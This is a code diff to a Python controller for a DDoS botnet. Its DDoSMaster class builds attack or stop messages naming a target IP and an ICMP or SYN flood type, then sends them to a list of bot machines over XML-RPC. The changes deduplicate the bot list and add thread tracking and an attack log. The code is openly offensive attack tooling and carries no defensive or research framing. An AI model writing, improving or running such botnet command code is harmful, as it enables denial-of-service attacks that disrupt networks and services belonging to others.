@@ -2,11 +2,10 @@
 message_format = {
     "type": "attack", # "attack" or "stop"
     "target_ip": "0.0.0.0",
-    "attack_type": "icmp",
-    "number_of_attack": -1 # -1 for unlimited attack
+    "attack_type": "icmp", "icmp" or "syn"
+    "number_of_attack": 1
 }
 """
-# from multiprocessing import Pool
 import xmlrpc.client
 import os
 import threading
@@ -29,21 +28,28 @@ class CommandRunner(threading.Thread):
 class DDoSMaster:
     def __init__(self):
         # self.p = Pool(2)
-        self.botnets = self.getBotNetList()
+        self.botnets = list(set(self.getBotNetList()))
         self.message = {
             "type": "attack",  # "attack" or "stop"
             "target_ip": "192.168.1.1",
             "attack_type": "icmp",
-            "number_of_attack": 100
+            "number_of_attack": 5
         }
+        self.bot_thread = []
+        self.attack_log = []
 
     def distributeCommand(self):
         """distributing command that has been build to botnet"""
         # print(self.botnets)
         for bot in self.botnets:
-            print(bot + " --attacking--> " + self.message["target_ip"])
+            if self.message["type"] == "attack":
+                print(bot + " --attacking--> " + self.message["target_ip"])
+            elif self.message["type"] == "stop":
+                print(bot + " --stop attacking--X " +
+                      self.message["target_ip"])
             try:
                 current = CommandRunner(bot, self.message)
+                self.bot_thread.append(current)
                 current.start()
             except ConnectionRefusedError:
                 print("BotNet died! IP: ", bot)
